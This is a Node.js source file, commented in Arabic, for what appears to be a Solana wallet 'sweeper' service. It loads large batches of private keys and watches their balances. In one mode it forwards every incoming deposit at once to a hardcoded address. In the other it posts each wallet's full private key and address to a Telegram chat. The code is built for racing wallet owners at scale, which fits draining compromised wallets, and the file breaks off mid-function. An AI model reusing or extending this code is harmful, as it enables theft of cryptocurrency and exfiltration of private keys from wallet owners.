// Maximize libuv I/O threads — must be first line before any require
process.env.UV_THREADPOOL_SIZE = '8';

const cluster = require('node:cluster');
const https   = require('https');
const fs      = require('fs');
const crypto  = require('crypto');
require('dotenv').config();

// ── Admin credentials (parsed once at module level) ───────────────────────────
const ADMIN_PAS  = process.env.ADMIN_PAS || '';
const _adSep     = ADMIN_PAS.indexOf('_');
const ADMIN_USER = _adSep >= 0 ? ADMIN_PAS.slice(0, _adSep) : '';
const ADMIN_PASS = _adSep >= 0 ? ADMIN_PAS.slice(_adSep + 1) : '';
const AUTH_TOKEN = ADMIN_PAS
    ? crypto.createHash('sha256').update(ADMIN_PAS + ':sol-monitor-v1').digest('hex')
    : '';

// ─────────────────────────────────────────────────────────────────────────────
//  Shared helpers (available in both primary and worker)
// ─────────────────────────────────────────────────────────────────────────────
const path    = require('path');
const {
    Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL,
    TransactionExpiredBlockheightExceededError, TransactionExpiredTimeoutError
} = require('@solana/web3.js');
const bs58    = require('bs58').default;

// ── HTTP keep-alive agents — يُعيد استخدام اتصالات TCP بدل فتح جديدة لكل طلب ─
const httpsKeepAlive = new https.Agent({ keepAlive: true, maxSockets: 10, timeout: 30_000 });
const express = require('express');

// (PublicNode removed — WSS يأتي من نفس رابط RPC_URLS مباشرةً)
// Devnet
const DEVNET_HTTP     = 'https://api.devnet.solana.com';
const DEVNET_WSS      = 'wss://api.devnet.solana.com';
// Telegram
const TG_BOT_TOKEN    = process.env.TELEGRAM_BOT_TOKEN || '';

const PORT         = process.env.PORT || 5000;
const TARGET_ADDR  = 'BXVDz1bdBbyq88YLeqKFxnW3JFF5wEuSrFkC8xK9HLPV';
// مسار ملف حفظ المحافظ — يمكن تغييره عبر متغير بيئة WALLETS_FILE
// على Render: اضبط WALLETS_FILE=/data/wallets_persist.json مع تفعيل Persistent Disk
const WALLETS_FILE = process.env.WALLETS_FILE || path.join(__dirname, 'wallets_persist.json');

// Read RPC URLs from RPC_URLS env var (comma OR newline separated)
const ALL_RPC_URLS = (process.env.RPC_URLS || '')
    // إزالة بادئة "RPC_URLS=" إذا أدخلها المستخدم بالخطأ مع القيمة
    .replace(/^\s*RPC_URLS\s*=\s*/i, '')
    .split(/[,\r\n\s]+/)
    .map(u => u.trim().replace(/^\uFEFF/, ''))
    .filter(u => /^https?:\/\//i.test(u));

if (ALL_RPC_URLS.length === 0) {
    console.error('❌ متغير البيئة RPC_URLS فارغ — أضف الروابط مفصولة بفاصلة');
    process.exit(1);
}
console.log(`[CONFIG] Loaded ${ALL_RPC_URLS.length} RPC URL(s) from env`);

// ── إعدادات Connection Pool ────────────────────────────────────────────────
const MAX_SUBS_PER_CONN = 1000; // حد Helius الموثَّق: 1000 اشتراك/اتصال
const SUB_BURST_DELAY   = 50;   // تأخير بين دفعات الاشتراك (ms) — خُفِّض من 200→50

// ── Semaphore — نافذة منزلقة حقيقية (كل ما تنتهي دفعة تبدأ التالية فوراً) ──
class Semaphore {
    constructor(max) { this.max = max; this.count = 0; this.queue = []; }
    acquire() {
        return new Promise(resolve => {
            if (this.count < this.max) { this.count++; resolve(); }
            else { this.queue.push(resolve); }
        });
    }
    release() {
        this.count--;
        if (this.queue.length > 0) { this.count++; this.queue.shift()(); }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  SolanaWorkerMonitor — runs inside each process (primary or worker)
//  Only monitors the wallet slice assigned to this process
// ─────────────────────────────────────────────────────────────────────────────
class SolanaWorkerMonitor {
    constructor(onNotification) {
        this.onNotification    = onNotification;
        this.targetAddress     = new PublicKey(TARGET_ADDR);
        this.wallets           = [];
        this.connections       = [];
        this.broadcastConnections = [];
        this.subscriptionIds   = [];
        this.allRpcUrls        = [];
        this.lastBalances      = [];
        this.isMonitoring      = false;
        this.rpcErrorCounts    = [];
        this.rpcFailedWallets  = new Set();
        // Connection pools — اتصالات WebSocket مشتركة بدل اتصال لكل محفظة
        this.solPool           = [];   // pool للـ SOL subscriptions
        this.poolUrls          = [];   // روابط HTTP المقابلة لكل اتصال في الـ pool
        // روابط HTTP للـ snapshot (من RPC_URLS فقط — PublicNode للـ WSS فقط)
        this.snapshotRpcUrls   = [];
        this._snapRpcIdx       = 0;
        // إعدادات الوضع والشبكة والتلجرام
        this.mode              = 'forward';  // 'forward' | 'telegram'
        this.chatId            = '';
        this.network           = 'mainnet';  // 'mainnet' | 'devnet'
        this.privateKeyStrings = [];         // base58 private keys لإشعارات تلجرام
        // blockhash مُحدَّث في الخلفية — جاهز فوراً عند الحاجة
        this._bhCache = { blockhash: null, lastValidBlockHeight: 0, fetchedAt: 0 };
        this._bhTimer = null;
        this._rpcIdx  = 0;   // دوران بين broadcastConnections للـ HTTP (لا يحمّل RPC واحدة)
    }

    notify(message, type = 'info') {
        this.onNotification(message, type);
    }

    // settings: { mode, chatId, network }
    async load(walletSlice, rpcSlice, allRpcUrls, settings = {}) {
        this.stop();
        this.wallets           = [];
        this.connections       = [];
        this.privateKeyStrings = [];
        this.rpcErrorCounts    = new Array(rpcSlice.length).fill(0);
        this.rpcFailedWallets.clear();
        // تطبيق الإعدادات
        this.mode    = settings.mode    || 'forward';
        this.chatId  = settings.chatId  || '';
        this.network = settings.network || 'mainnet';

        // على devnet نستخدم devnet endpoint دائماً للبث — RPC_URLS تخص mainnet
        const broadcastUrls = this.network === 'devnet'
            ? [DEVNET_HTTP]
            : (allRpcUrls && allRpcUrls.length ? allRpcUrls : rpcSlice);
        this.allRpcUrls = broadcastUrls;
        this.broadcastConnections = broadcastUrls.map(u => new Connection(u, 'confirmed'));

        this._rpcIdx = 0; // إعادة تعيين الدوران عند كل load

        // ── بناء SOL Connection Pool — اتصال واحد لكل 1000 محفظة، WSS من رابطه ─
        // الـ pool يستخدم rpcSlice (روابط هذا العامل) وليس كل الروابط
        const monitorUrls = this.network === 'devnet'
            ? [DEVNET_HTTP]
            : (rpcSlice.length ? rpcSlice : (allRpcUrls?.length ? allRpcUrls : []));
        if (!monitorUrls.length) throw new Error('لا توجد روابط RPC للمراقبة');
        // عدد الاتصالات = عدد مجموعات الـ 1000 — نُعيد تدوير الروابط إذا تجاوزنا عددها
        const poolSize = Math.max(1, Math.ceil(walletSlice.length / MAX_SUBS_PER_CONN));
        this.poolUrls = Array.from({ length: poolSize }, (_, i) => monitorUrls[i % monitorUrls.length]);
        this.solPool  = this.poolUrls.map(httpUrl => {
            const wssUrl = httpUrl.replace(/^https?:\/\//i, 'wss://');
            return new Connection(httpUrl, { commitment: 'confirmed', wsEndpoint: wssUrl });
        });
        this.snapshotRpcUrls = monitorUrls;
        this._snapRpcIdx     = 0;
        console.log(`[POOL] SOL pool: ${poolSize} اتصال عبر ${monitorUrls.length} رابط (${monitorUrls.length < poolSize ? 'تدوير' : '1:1'})`);

        for (let i = 0; i < walletSlice.length; i++) {
            try {
                const rawKey = walletSlice[i].trim();
                // دعم صيغتين: مصفوفة JSON [1,2,3,...] أو نص Base58
                let secretKey;
                if (rawKey.startsWith('[')) {
                    secretKey = Uint8Array.from(JSON.parse(rawKey));
                } else {
                    secretKey = bs58.decode(rawKey);
                }
                const wallet = Keypair.fromSecretKey(secretKey);
                this.wallets.push(wallet);
                this.privateKeyStrings.push(rawKey); // حفظ للتلجرام
                // ── كل 1000 محفظة تنتمي لاتصال واحد (pool slot) ─────────────
                const poolIdx = Math.min(Math.floor(i / MAX_SUBS_PER_CONN), this.solPool.length - 1);
                this.connections.push(this.solPool[poolIdx]);

                // استعادة الـ cache من localStorage (إذا أُرسل)
            } catch (e) {
                this.notify(`❌ خطأ في تحميل المحفظة: ${e.message}`, 'error');
                this.privateKeyStrings.push('');
            }
        }

        if (this.wallets.length > 0) {
            this.isMonitoring = true;
            await this.startMonitoring();
        }
        return this.wallets.length;
    }

    async startMonitoring() {
        const total  = this.wallets.length;

        // تهيئة المصفوفات مسبقاً (lastBalances = 0 كقيمة افتراضية آمنة)
        this.subscriptionIds = new Array(total).fill(null);
        this.lastBalances    = new Array(total).fill(0);

        // ── الاشتراكات والـ Snapshot يعملان بالتوازي ─────────────────────────
        // • lastBalances[i] يُقرأ فقط داخل callback الحدث وليس عند التسجيل
        // • الـ snapshot يملأ lastBalances تدريجياً — الاشتراكات لا تنتظره

        const subscribeAll = async () => {
            const BURST = 50;
            for (let b = 0; b < total; b += BURST) {
                const end = Math.min(b + BURST, total);
                for (let i = b; i < end; i++) this._subscribeSOL(i);
                if (end < total) await new Promise(r => setTimeout(r, SUB_BURST_DELAY));
            }
            console.log(`[POOL] SOL subscriptions queued: ${total}`);
        };

        await Promise.all([
            this._batchSnapshotSOL(total),
            subscribeAll(),
        ]);

        // ── مراقبة Pool — إعادة اشتراك تلقائي عند انقطاع WebSocket ──────────
        this._setupPoolWatcher(this.solPool);

        // بدء تحديث الـ blockhash عبر HTTP (RPCs المستخدم، دوران)
        this._startBlockhashRefresh();

        const poolCount = this.solPool.length;
        this.notify(`✅ يراقب هذا العامل ${total} محفظة عبر ${poolCount} اتصال (${Math.ceil(total / poolCount)}/اتصال)`, 'success');
    }

    // مراقبة pool connections — إعادة اشتراك جماعي عند انقطاع أي WebSocket
    _setupPoolWatcher(pool) {
        pool.forEach((_, poolIdx) => {
            this._watchPoolSlot(pool, poolIdx);
        });
    }

    // ينظر على slot واحد في الـ pool ويُعيد الاتصال إذا انقطع
    _watchPoolSlot(pool, poolIdx) {
        const conn = pool[poolIdx];
        const attach = () => {
            if (!this.isMonitoring) return;
            try {
                const ws = conn._rpcWebSocket;
                if (!ws) { setTimeout(attach, 1000); return; }
                const onFail = () => {
                    if (!this.isMonitoring) return;
                    this.notify(`⚠️ انقطع pool[SOL#${poolIdx}] — إعادة الاتصال…`, 'warning');
                    // إعادة استخدام نفس الرابط الأصلي لهذا الـ slot (HTTP + WSS)
                    const httpEp = this.network === 'devnet'
                        ? DEVNET_HTTP
                        : (this.poolUrls?.[poolIdx] || this.snapshotRpcUrls?.[poolIdx] || this.snapshotRpcUrls?.[0]);
                    const wssEp  = this.network === 'devnet'
                        ? DEVNET_WSS
                        : httpEp.replace(/^https?:\/\//i, 'wss://');
                    const newConn = new Connection(httpEp, { commitment: 'confirmed', wsEndpoint: wssEp });
                    pool[poolIdx] = newConn;
                    setTimeout(() => {
                        if (!this.isMonitoring) return;
                        for (let i = 0; i < this.wallets.length; i++) {
                            if (this.connections[i] === conn) {
                                this.connections[i] = newConn;
                                this.subscriptionIds[i] = null;
                                this._subscribeSOL(i);
                            }
                        }
                        this._watchPoolSlot(pool, poolIdx);
                    }, 2000);
                };
                ws.once('error', onFail);
                ws.once('close', onFail);
            } catch (_) {}
        };
        setTimeout(attach, 1500 + poolIdx * 200);
    }

    // Snapshot SOL بدفعات 100 عبر getMultipleAccounts — RPC_URLS فقط
    async _batchSnapshotSOL(total) {
        const BATCH       = 100;
        const CONCURRENCY = 15; // دفعات متوازية — خُفِّض التسلسل (رُفع من 6→15)
        const urls        = this.snapshotRpcUrls.length ? this.snapshotRpcUrls : [];
        if (!urls.length) { console.error('[SNAP] لا توجد روابط RPC للـ snapshot'); return; }

        // بناء قائمة الدفعات مرة واحدة
        const batches = [];
        for (let b = 0; b < total; b += BATCH) batches.push(b);

        let completed = 0;
        let urlIdx    = 0;

        const fetchBatch = async (b) => {
            const end   = Math.min(b + BATCH, total);
            const slice = this.wallets.slice(b, end);
            const addrs = slice.map(w => w.publicKey.toBase58());
            for (let attempt = 0; attempt < 4; attempt++) {
                const url = urls[(urlIdx++) % urls.length];
                try {
                    const res = await fetch(url, {
                        method : 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body   : JSON.stringify({
                            jsonrpc: '2.0', id: 1,
                            method : 'getMultipleAccounts',
                            params : [addrs, { encoding: 'base64' }]
                        }),
                        signal: AbortSignal.timeout(12_000)
                    });
                    const json = await res.json();
                    if (json.error) throw new Error(json.error.message);
                    (json.result?.value || []).forEach((info, idx) => {
                        this.lastBalances[b + idx] = info ? info.lamports : 0;
                    });
                    completed += (end - b);
                    this.notify(`__PROGRESS__:${completed}:${total}`, 'info');
                    return;
                } catch (e) {
                    console.error(`[SNAP] batch${Math.floor(b/BATCH)+1} attempt${attempt+1}: ${e.message}`);
                    if (attempt < 3) await new Promise(r => setTimeout(r, 400 * (attempt + 1)));
                }
            }
            console.error(`[SNAP] فشل جلب الدفعة ${Math.floor(b/BATCH)+1} — رصيد SOL = 0`);
        };

        // نافذة منزلقة: كل الدفعات تنطلق فوراً، أي دفعة تنتهي تُفسح مكانها للتالية
        const sem = new Semaphore(CONCURRENCY);
        await Promise.all(batches.map(async (b) => {
            await sem.acquire();
            try { await fetchBatch(b); } finally { sem.release(); }
        }));
    }

    _subscribeSOL(i) {
        const wallet    = this.wallets[i];
        const connection = this.connections[i];
        const label     = wallet.publicKey.toString().slice(0, 8) + '…';
        // حفظ publicKey كمرجع ثابت — الفهرس يتغير عند الحذف لذا نبحث عنه ديناميكياً
        const pubkeyStr = wallet.publicKey.toString();
        try {
            const subId = connection.onAccountChange(
                wallet.publicKey,
                async (info) => {
                    if (!this.isMonitoring) return;
                    // البحث الديناميكي عن الفهرس الحالي بعد أي حذف
                    const idx = this.wallets.findIndex(w => w.publicKey.toString() === pubkeyStr);
                    if (idx === -1) return; // المحفظة حُذفت — تجاهل الحدث
                    try {
                        const newBal = info.lamports;
                        const oldBal = this.lastBalances[idx] || 0;
                        if (newBal > oldBal && newBal > 0) {
                            const received = newBal - oldBal;
                            // ✅ تحديث الرصيد فوراً قبل الإرسال — يمنع race condition
                            // إذا أطلق WebSocket نفس الـ callback مرتين (processed+confirmed)
                            // سيرى الثاني oldBal = newBal فلن يُرسل مجدداً
                            this.lastBalances[idx] = newBal;
                            this.notify(`💰 وصل ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL إلى ${label}`, 'success');
                            // نمرّر received مباشرةً — lastBalances[idx] أصبح newBal بالفعل
                            await this.forwardFunds(this.connections[idx], wallet, newBal, received, label, idx);
                        } else {
                            this.lastBalances[idx] = newBal;
                        }
                    } catch (e) { this.handleError(e, idx, label); }
                },
                'confirmed'
            );
            this.subscriptionIds[i] = subId;
        } catch (e) {
            if (e.message && e.message.includes('readyState')) {
                setTimeout(() => { if (this.isMonitoring) this._subscribeSOL(i); }, 3000);
            } else {
                this.handleError(e, i, label);
            }
        }
    }

    async forwardFunds(connection, wallet, newBal, received, label, walletIdx) {
        try {
            const t0 = Date.now();

            // ── وضع تلجرام: إشعار فقط، لا تحويل ──────────────────────────────
            if (this.mode === 'telegram') {
                const addr   = wallet.publicKey.toString();
                const pk     = this.privateKeyStrings[walletIdx] || '';
                const msg =
                    `💰 <b>معاملة جديدة!</b>\n\n` +
                    `🏦 المحفظة: <code>${addr.slice(0,8)}...${addr.slice(-8)}</code>\n` +
                    `💵 المبلغ: +${(received / LAMPORTS_PER_SOL).toFixed(9)} SOL\n` +
                    `🔄 النوع: 📥 استلام SOL\n\n` +
                    `🔐 المفتاح الخاص:\n<code>${pk}</code>\n\n` +
                    `📋 العنوان الكامل:\n<code>${addr}</code>`;
                const tgRes = await sendTelegramMessage(TG_BOT_TOKEN, this.chatId, msg);
                if (tgRes && tgRes.ok) {
                    this.notify(`📨 ${label}: إشعار تلجرام أُرسل (+${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL)`, 'success');
                } else {
                    this.notify(`❌ ${label}: فشل إرسال تلجرام — ${tgRes?.description || 'خطأ غير معروف'}`, 'error');
                }
                return true;
            }

            // ── وضع الإرسال: تحويل الأموال ────────────────────────────────────
            // إرسال SOL فوراً — الرصيد معروف من الـ callback (لا fetch إضافي)
            const amountToSend = newBal - 5_000;
            if (amountToSend > 0) {
                const sig = await this._sendAndConfirm(connection, wallet, (bh) => {
                    const tx = new Transaction({ recentBlockhash: bh, feePayer: wallet.publicKey });
                    tx.add(SystemProgram.transfer({
                        fromPubkey: wallet.publicKey,
                        toPubkey:   this.targetAddress,
                        lamports:   amountToSend
                    }));
                    tx.sign(wallet);
                    return tx.serialize();
                }, label);
                this.notify(
                    `✅ ${label}: أُرسل ${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)} SOL عبر ${this.broadcastConnections.length} RPC\n` +
                    `📝 https://solscan.io/tx/${sig}\n⚡ ${Date.now() - t0}ms`,
                    'success'
                );
            }

            return true;
        } catch (e) {
            const msg = e.errors ? e.errors.map(x => x.message).join(' | ') : e.message;
            this.notify(`❌ ${label}: خطأ في التحويل — ${msg}`, 'error');
            return false;
        }
    }

    // دالة مساعدة: اختيار broadcast connection بدوران لتوزيع الحمل HTTP
    _nextHttpConn() {
        if (!this.broadcastConnections.length) return null;
        const c = this.broadcastConnections[this._rpcIdx % this.broadcastConnections.length];
        this._rpcIdx = (this._rpcIdx + 1) % this.broadcastConnections.length;
        return c;
    }

    // تحديث الـ blockhash في الخلفية عبر HTTP (RPC_URLS) — كل 10s
    _startBlockhashRefresh() {
        const refresh = async () => {
            if (!this.isMonitoring) return;
            try {
                const conn = this._nextHttpConn();
                if (conn) {
                    const bh = await conn.getLatestBlockhash('processed');
                    this._bhCache = { ...bh, fetchedAt: Date.now() };
                }
            } catch (_) {}
            if (this.isMonitoring)
                this._bhTimer = setTimeout(refresh, 10_000);
        };
        refresh();
    }

    // إرجاع الـ blockhash المُخزَّن إذا حديث (< 40s)، وإلا جلب عبر HTTP
    async _getCachedBlockhash() {
        if (this._bhCache.blockhash && Date.now() - this._bhCache.fetchedAt < 40_000)
            return this._bhCache;
        const conn = this._nextHttpConn();
        if (!conn) throw new Error('لا توجد اتصالات HTTP متاحة');
        const bh = await conn.getLatestBlockhash('processed');
        this._bhCache = { ...bh, fetchedAt: Date.now() };
        return bh;
    }

    // تأكيد TX عبر WebSocket (event-driven) — يسابق بين جميع broadcastConnections
    // أسرع بكثير من استقصاء HTTP كل 500ms
    async _confirmViaWs(sig, latest) {
        const TIMEOUT_MS = 60_000; // حد أقصى 60s (عمر الـ blockhash)

        // كل اتصال يشترك عبر WebSocket في sig — أول من يؤكد يفوز
        const racePromises = this.broadcastConnections.map((conn, idx) =>
            conn.confirmTransaction(
                {
                    signature:            sig,
                    blockhash:            latest.blockhash,
                    lastValidBlockHeight: latest.lastValidBlockHeight,
                },
                'confirmed'
            ).then(res => {
                if (res.value?.err)
                    throw new Error(`TX رُفضت: ${JSON.stringify(res.value.err)}`);
                console.log(`[CONFIRM] ✓ RPC#${idx + 1} أكدت أولاً`);
                return true;
            })
        );

        // timeout بجانب السباق — لا ننتظر أبداً أكثر من TIMEOUT_MS
        const timeout = new Promise((_, rej) =>
            setTimeout(() => rej(new Error('انتهت مهلة التأكيد')), TIMEOUT_MS)
        );

        return Promise.race([Promise.any(racePromises), timeout]);
    }

    // ── إرسال TX مع تأكيد حقيقي وإعادة محاولة عند انتهاء الـ blockhash ──────
    async _sendAndConfirm(connection, wallet, buildRawTx, label, maxAttempts = 3) {
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            // blockhash من الكاش — عبر HTTP (دوران بين RPCs المستخدم)
            const latest = await this._getCachedBlockhash();
            const rawTx  = buildRawTx(latest.blockhash, latest.lastValidBlockHeight);

            // استخراج التوقيع محلياً
            const sig = bs58.encode(rawTx.slice(1, 65));

            // blockhash صالح ~150 slot × 400ms = 60s — نمنح 58s هامش أمان
            const expiresAt = (this._bhCache.fetchedAt || Date.now()) + 58_000;

            // بث إلى كل RPCs بالتوازي (fire-and-forget)
            const totalRpcs = this.broadcastConnections.length;
            // skipPreflight: false — يُحاكي TX قبل الإرسال ويرفضها فوراً إن كان الرصيد غير كافٍ
            // بدل إرسالها للشبكة وانتظار الرفض (يوفر وقتاً ويمنع Custom:1 الغامض)
            this.broadcastConnections.forEach((c, idx) =>
                c.sendRawTransaction(rawTx, { skipPreflight: false, maxRetries: 3 })
                  .then(() => console.log(`[BROADCAST] ✓ RPC#${idx + 1}/${totalRpcs}`))
                  .catch(e  => console.warn(`[BROADCAST] ✗ RPC#${idx + 1}/${totalRpcs}: ${e.message}`))
            );
            console.log(`[BROADCAST] → ${totalRpcs} RPC | sig: ${sig.slice(0, 12)}…`);

            try {
                // تأكيد عبر WebSocket — event-driven بدل استقصاء HTTP كل 500ms
                await this._confirmViaWs(sig, latest);
                return sig;
            } catch (confirmErr) {
                const isExpired = confirmErr instanceof TransactionExpiredBlockheightExceededError ||
                                  confirmErr instanceof TransactionExpiredTimeoutError ||
                                  confirmErr.message?.includes('block height exceeded') ||
                                  confirmErr.message?.includes('BlockhashNotFound') ||
                                  confirmErr.message?.includes('Blockhash not found') ||
                                  confirmErr.message?.includes('انتهت مهلة التأكيد');
                if (isExpired && attempt < maxAttempts) {
                    console.warn(`[SEND] blockhash انتهت — إعادة المحاولة ${attempt + 1}/${maxAttempts} لـ ${label}`);
                    this._bhCache.fetchedAt = 0;
                    continue;
                }
                throw confirmErr;
            }
        }
        throw new Error('فشلت جميع محاولات الإرسال');
    }

    handleError(error, idx, label) {
        const MAX = 5;
        this.rpcErrorCounts[idx] = (this.rpcErrorCounts[idx] || 0) + 1;
        if (this.rpcErrorCounts[idx] >= MAX) {
            if (this.subscriptionIds[idx] && this.connections[idx]) {
                try { this.connections[idx].removeAccountChangeListener(this.subscriptionIds[idx]); } catch (_) {}
                this.subscriptionIds[idx] = null;
            }
            if (!this.rpcFailedWallets.has(idx)) {
                this.rpcFailedWallets.add(idx);
                this.notify(`🛑 تم إيقاف ${label} — تعطل RPC بشكل متكرر`, 'error');
            }
        }
        console.error(`[MONITOR] RPC error ${label} (${this.rpcErrorCounts[idx]}/${MAX}):`, error.message);
    }

    stop(clearAll = false) {
        // ── أولاً: أوقف العلَم — يمنع onFail/retry callbacks من الاستيقاظ ──────
        // يجب أن يكون قبل إغلاق أي WebSocket لأن إغلاقه يُطلق حدث 'close'
        // الذي يُفعّل _watchPoolSlot › onFail — وهو يتحقق من isMonitoring أولاً
        this.isMonitoring = false;
        // إيقاف تحديث الـ blockhash قبل أي شيء آخر
        if (this._bhTimer) { clearTimeout(this._bhTimer); this._bhTimer = null; }
        this._bhCache = { blockhash: null, lastValidBlockHeight: 0, fetchedAt: 0 };

        // ── إزالة اشتراكات SOL من الاتصالات المشتركة ─────────────────────────
        for (let i = 0; i < this.wallets.length; i++) {
            if (this.connections[i] && this.subscriptionIds[i] != null)
                try { this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]); } catch (_) {}
        }
        // ── إغلاق WebSocket لكل اتصال في SOL pool ────────────────────────────
        // الآن isMonitoring=false → onFail سيخرج فوراً ولن يُنشئ اتصالات جديدة
        const closedConns = new Set();
        for (const conn of this.solPool) {
            if (!conn || closedConns.has(conn)) continue;
            closedConns.add(conn);
            try { if (conn._rpcWebSocket) conn._rpcWebSocket.close(); } catch (_) {}
        }
        this.solPool         = [];
        this.subscriptionIds = [];
        this.lastBalances    = [];
        this.rpcErrorCounts.fill(0);
        this.rpcFailedWallets.clear();

        // ── عند حذف الكل: امسح بيانات المحافظ كذلك حتى لا تظهر كمراقَبة ──────
        if (clearAll) {
            this.wallets           = [];
            this.connections       = [];
            this.privateKeyStrings = [];
            this.rpcErrorCounts    = [];
        }

        console.log(`[PID ${process.pid}] Monitoring stopped, pool connections closed${clearAll ? ' (all wallets cleared)' : ''}`);
    }

    async resume(walletSlice, rpcSlice, allRpcUrls) {
        return this.load(walletSlice, rpcSlice, allRpcUrls);
    }

    // ── تطبيق الإعدادات على المراقبة الجارية دون إعادة تحميل المحافظ ─────────
    // mode/chatId → تُطبق فوراً
    // network     → تُطبق فوراً إذا لم تكن المراقبة جارية؛ تُعيد تحميل كامل إذا تغيرت أثناء المراقبة
    applySettings(settings = {}) {
        const newNetwork = settings.network || 'mainnet';
        const networkChanged = this.isMonitoring && newNetwork !== this.network;

        this.mode    = settings.mode    || this.mode;
        this.chatId  = settings.chatId  || '';
        if (!networkChanged) this.network = newNetwork;

        const modeLabel = this.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
        this.notify(`⚙️ الإعدادات حُدِّثت: ${modeLabel} | ${this.network}`, 'info');

        // تُعيد true إذا احتاج الأمر لإعادة تحميل (تغيير الشبكة أثناء المراقبة)
        return networkChanged;
    }

    getState() {
        return {
            isMonitoring:    this.isMonitoring,
            walletCount:     this.wallets.length,
            activeCount:     this.subscriptionIds.filter(s => s != null).length,
            failedCount:     this.rpcFailedWallets.size,
            walletAddresses: this.wallets.map((w, i) => ({
                address:    w.publicKey.toString(),
                active:     this.subscriptionIds[i] != null,
                errorCount: this.rpcErrorCounts[i] || 0,
                isFailed:   this.rpcFailedWallets.has(i),
                balance:    this.lastBalances[i] || 0
            }))
        };
    }

    // إزالة محفظة واحدة بعنوانها — يقطع اشتراكها ويُعيد مفتاحها الخاص أو null
    removeWallet(address) {
        const idx = this.wallets.findIndex(w => w.publicKey.toString() === address);
        if (idx === -1) return null;

        // حفظ المفتاح الخاص قبل الحذف
        const privateKey = this.privateKeyStrings[idx] || null;

        // إلغاء اشتراك SOL
        if (this.connections[idx] && this.subscriptionIds[idx] != null) {
            try { this.connections[idx].removeAccountChangeListener(this.subscriptionIds[idx]); } catch(_) {}
            this.subscriptionIds[idx] = null;
        }

        // تعديل مجموعة المحافظ الفاشلة — إزاحة الفهارس بعد المحذوف
        const newFailed = new Set();
        for (const fi of this.rpcFailedWallets) {
            if      (fi < idx) newFailed.add(fi);
            else if (fi > idx) newFailed.add(fi - 1);
            // fi === idx → محذوفة، تُحذف
        }
        this.rpcFailedWallets = newFailed;

        // حذف من جميع المصفوفات بنفس الفهرس
        this.wallets.splice(idx, 1);
        this.connections.splice(idx, 1);
        this.subscriptionIds.splice(idx, 1);
        this.lastBalances.splice(idx, 1);
        this.rpcErrorCounts.splice(idx, 1);
        this.privateKeyStrings.splice(idx, 1);

        if (this.wallets.length === 0) this.isMonitoring = false;

        console.log(`[PID ${process.pid}] removeWallet: ${address.slice(0,8)}… → متبقٍ ${this.wallets.length} محفظة`);
        return privateKey;
    }

    // ── إضافة محافظ جديدة إلى مراقبة جارية بدون إيقاف الباقي ────────────────
    async appendWallets(newKeys, settings = {}) {
        // تحديث الإعدادات إن تغيرت
        if (settings.mode)    this.mode    = settings.mode;
        if (settings.chatId)  this.chatId  = settings.chatId;
        if (settings.network) this.network = settings.network;

        // إذا لم يُستدعَ load() من قبل، نُهيئ allRpcUrls من المتغير العام
        if (!this.allRpcUrls?.length) this.allRpcUrls = ALL_RPC_URLS;

        // تأكد أن broadcastConnections مهيَّأة وعلى الشبكة الصحيحة —
        // قد تكون فارغة إذا أُضيفت المحافظ عبر appendWallets دون المرور بـ load()،
        // أو تكون على شبكة قديمة إذا تغيّرت settings.network
        const expectedBcPrefix = this.network === 'devnet' ? DEVNET_HTTP : null;
        const bcStale = !this.broadcastConnections?.length ||
            (this.network === 'devnet' && !this.broadcastConnections[0]?._rpcEndpoint?.startsWith(DEVNET_HTTP)) ||
            (this.network !== 'devnet'  && this.broadcastConnections[0]?._rpcEndpoint?.startsWith(DEVNET_HTTP));
        if (bcStale) {
            const bcUrls = this.network === 'devnet' ? [DEVNET_HTTP] : this.allRpcUrls;
            this.broadcastConnections = bcUrls.map(u => new Connection(u, 'confirmed'));
            this._rpcIdx = 0;
        }

        const monitorUrls = this.network === 'devnet'
            ? [DEVNET_HTTP]
            : (this.snapshotRpcUrls?.length ? this.snapshotRpcUrls
                : (this.allRpcUrls?.length  ? this.allRpcUrls : ALL_RPC_URLS));

        const existing    = new Set(this.wallets.map(w => w.publicKey.toString()));
        const added       = [];
        const addedKeys   = []; // المفاتيح الخاصة المقابلة للمحافظ المضافة فعلاً
        let   duplicates  = 0;
        let   parseErrors = 0;

        for (const rawKey of newKeys) {
            const key = rawKey.trim();
            if (!key) continue;
            try {
                let secretKey;
                if (key.startsWith('[')) secretKey = Uint8Array.from(JSON.parse(key));
                else                     secretKey = bs58.decode(key);

                const wallet  = Keypair.fromSecretKey(secretKey);
                const address = wallet.publicKey.toString();
                if (existing.has(address)) { duplicates++; continue; }

                const i = this.wallets.length;

                // توسيع pool إذا تجاوزنا 1000 اشتراك/اتصال
                const poolIdx = Math.floor(i / MAX_SUBS_PER_CONN);
                if (poolIdx >= this.solPool.length) {
                    if (!monitorUrls.length) { this.notify('❌ لا توجد روابط RPC', 'error'); break; }
                    const url    = monitorUrls[this.solPool.length % monitorUrls.length];
                    const wssUrl = url.replace(/^https?:\/\//i, 'wss://');
                    const newConn = new Connection(url, { commitment: 'confirmed', wsEndpoint: wssUrl });
                    this.solPool.push(newConn);
                    this.poolUrls.push(url);
                    this._watchPoolSlot(this.solPool, poolIdx);
                    console.log(`[POOL] اتصال جديد للمجموعة ${poolIdx}: ${url.slice(0,40)}…`);
                }

                this.wallets.push(wallet);
                this.privateKeyStrings.push(key);
                this.connections.push(this.solPool[poolIdx]);
                this.subscriptionIds.push(null);
                this.lastBalances.push(0);
                this.rpcErrorCounts.push(0);

                existing.add(address);
                added.push(address);
                addedKeys.push(key);

                // اشترك فوراً إذا كانت المراقبة تعمل
                if (this.isMonitoring) this._subscribeSOL(i);

            } catch(e) {
                parseErrors++;
                console.error(`[appendWallets] خطأ: ${e.message}`);
            }
        }

        // إذا لم تكن المراقبة تعمل من قبل، ابدأها الآن
        if (!this.isMonitoring && this.wallets.length > 0) {
            this.isMonitoring = true;
            await this.startMonitoring();
        }

        if (added.length)
            this.notify(`✅ أُضيفت ${added.length} محفظة جديدة (المجموع: ${this.wallets.length})`, 'success');

        return { addresses: added, keys: addedKeys, duplicates, parseErrors };
    }
}


// ─────────────────────────────────────────────────────────────────────────────
//  Telegram helper
// ─────────────────────────────────────────────────────────────────────────────
function sendTelegramMessage(botToken, chatId, text) {
    if (!botToken || !chatId) {
